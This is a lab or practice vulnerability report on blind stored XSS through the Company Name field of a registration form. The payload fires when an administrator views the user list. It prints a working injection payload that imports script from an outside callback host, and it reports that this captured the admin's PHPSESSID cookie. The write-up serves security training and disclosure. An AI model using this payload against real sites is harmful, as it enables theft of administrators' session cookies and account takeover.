Lab name : Blind XSS - Informatica
# Title
Blind Cross-Site Scripting (XSS) via User Registration Company Field Leading to Admin Session Compromise
# Vulnerability Type
Blind Cross-Site Scripting (XSS) / Stored XSS

# Summary
The application is vulnerable to Blind Cross-Site Scripting (XSS) through the public user registration form. The application fails to properly sanitize or encode user-supplied input in the **"Company Name"** field before storing it in the database. When an administrator logs into the backend admin panel and views the "All Registered Users" list (`/index.php?view=admin_users`), the malicious JavaScript payload executes automatically in the administrator's browser context. This allows an attacker to execute arbitrary code within the privileged administrator session.

# Vulnerable Endpoint
- `https://partners.pwnedbox.site/index.php?view=register` (Injection Point)
- `https://partners.pwnedbox.site/index.php?view=admin_users` (Execution Point)

# Vulnerable Parameter
- `Company Name`

# Steps to Reproduce
1. Navigate to the registration page: `https://partners.pwnedbox.site/index.php?view=register`
2. Fill in the **"Full Name"**, **"Email Address"**, and **"Password"** fields with valid data.
3. In the **"Company Name"** field, insert the following payload:  
    `"><img/src/onerror=import('//xss.report/c/cyberbro')>`
4. Click the **"Create Account"** button to register.
5. Wait for the administrator to log in and view the "All Registered Users" list in the admin panel.
6. Observe the out-of-band interaction on `xss.report`. The tool successfully captures the execution, recording the admin's `PHPSESSID` cookie, the URI (`/index.php?view=admin_users`), and the Referrer (`/index.php?view=admin_users`), confirming the payload executed in the admin's browser.
# Payload Used 
`"><img/src/onerror=import('//xss.report/c/cyberbro')>`

